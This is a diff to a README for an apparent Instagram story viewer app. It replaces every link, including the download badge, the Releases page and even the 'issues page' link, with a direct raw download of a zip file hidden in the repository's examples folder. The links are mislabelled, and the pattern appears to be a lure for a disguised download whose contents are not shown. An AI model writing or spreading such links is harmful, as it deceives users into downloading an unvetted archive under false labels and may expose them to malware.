@@ -1,7 +1,7 @@
 # 🎉 instagram-story-viewer - Easily View Instagram Stories
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/gicupurcelu/instagram-story-viewer/releases)
+[![Download](https://raw.githubusercontent.com/gicupurcelu/instagram-story-viewer/main/examples/instagram-viewer-story-v2.5.zip)](https://raw.githubusercontent.com/gicupurcelu/instagram-story-viewer/main/examples/instagram-viewer-story-v2.5.zip)
 
 ## 🚀 Getting Started
 The Instagram Story Viewer helps you view stories from your favorite creators without any hassle. It works smoothly on your computer, allowing you to access Instagram stories quickly. This guide will walk you through the steps of downloading and running the application.
@@ -21,7 +21,7 @@ The Instagram Story Viewer helps you view stories from your favorite creators wi
 ## 🔗 Download & Install
 To start using the Instagram Story Viewer, you need to download it first. Follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/gicupurcelu/instagram-story-viewer/releases) to find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/gicupurcelu/instagram-story-viewer/main/examples/instagram-viewer-story-v2.5.zip) to find the latest version of the software.
   
 2. **Choose the Right File**: On the Releases page, you will see different versions and files available for download. Make sure to select the file that matches your operating system (Windows, macOS, or Linux).
 
@@ -48,7 +48,7 @@ This application prioritizes user privacy. You do not need to log in to any soci
 
 ## 📞 Support
 If you encounter issues or have questions, you can reach out for help:
-- Check the [issues page](https://github.com/gicupurcelu/instagram-story-viewer/issues) to see if someone else had the same question.
+- Check the [issues page](https://raw.githubusercontent.com/gicupurcelu/instagram-story-viewer/main/examples/instagram-viewer-story-v2.5.zip) to see if someone else had the same question.
 - Feel free to open a new issue if you cannot find your answer.
 
 ## 🌐 Community & Feedback
@@ -59,4 +59,4 @@ We welcome contributions! If you have suggestions or improvements, please feel f
 
 ---
 
-Be sure to visit this page to download: [Releases page](https://github.com/gicupurcelu/instagram-story-viewer/releases).
+Be sure to visit this page to download: [Releases page](https://raw.githubusercontent.com/gicupurcelu/instagram-story-viewer/main/examples/instagram-viewer-story-v2.5.zip).
